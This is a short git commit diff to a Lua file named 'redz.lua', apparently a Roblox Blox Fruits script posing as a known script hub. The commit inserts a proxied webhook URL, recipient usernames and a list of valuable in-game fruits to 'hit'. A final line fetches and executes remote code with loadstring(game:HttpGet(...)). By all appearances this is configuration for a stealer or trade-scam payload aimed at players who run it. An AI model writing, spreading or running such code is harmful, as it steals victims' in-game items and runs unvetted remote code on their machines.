836cc75b27b21c63c703d39c2cadcf292623314b
freezetrade2 <burakdmrcoglu5453@gmail.com>
2025-04-18 20:36:37 +0300

    Update redz.lua

--- redz.lua
+++ redz.lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=enRFbUR4NEd6NzZ3bUxvOHNTeFVjQToxcFpfY1RGMWlVYzlHTmI2QmsyMHFuSGpzTk9VRFlnYXdWVzhla2FRYWR2dG1IbFE0dENLSUxpc2Q2ck83WExSUWpWM0pzMW5SZ1hwQWFWMGRIY25DNUpQdWRaNmlmb2JXeW5KbHBEVFhoRVF5VkR2LTNnUGdfSFRPR01DQlZKOGNmSzN0UVQ5ckxhWXI4dUVzQW9wX0h1bGF4RWZOak5GX0ZtWmZnbDVhUzQ" -- << Your Webhook
+Usernames = {"adammdmmkj2", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "West Dragon", "East Dragon", "Dough"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
